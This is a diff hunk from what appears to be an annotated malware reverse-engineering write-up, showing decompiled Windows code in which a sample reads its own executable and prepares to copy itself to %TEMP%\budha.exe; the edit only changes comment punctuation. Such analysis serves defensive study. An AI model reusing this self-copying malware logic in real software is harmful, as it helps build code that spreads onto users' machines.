@@ -12,11 +12,11 @@ Sample SHA 256: 0000b060341630c2385b5cea8ce2e866671519b31641f5a0c525b880fc655d9e
   lpBuffer = (LPWSTR)HeapAlloc(hHeap, 8u, 0x2000u); // Memory Allocation ^
   GetModuleFileNameW(0, v0, 0x2000u); // Gets full path of current running process, stored in v0
   GetTempPathW(0x1000u, lpBuffer); // Gets path to %TEMP%, stored in lpBuffer
-  wsprintfW(lpBuffer, L"%s%s", lpBuffer, L"budha.exe"); // Builds the string %TEMP%\budha.exe (C:\Users\User1\Local\AppData\Temp\budha.exe)
+  wsprintfW(lpBuffer, L"%s%s", lpBuffer, L"budha.exe"); // Builds the string %TEMP%\budha.exe 'C:\Users\User1\Local\AppData\Temp\budha.exe'
   FileW = CreateFileW(v0, 0x80000000, 1u, 0, 3u, 0x80u, 0); // Creates a handle to itself, stored as FileW
   hFile = FileW; // hFile = Handle to itself
   if ( FileW == (HANDLE)-1 ) // If the handle creation failed..
-    return 1; // Return 1 to the calling process (failed)
+    return 1; // Return 1 to the calling process 'failed'
   nNumberOfBytesToRead = GetFileSize(FileW, 0);
   v3 = lstrlenW(v0);
   v4 = HeapAlloc(hHeap, 8u, nNumberOfBytesToRead + 2 * v3 + 4);
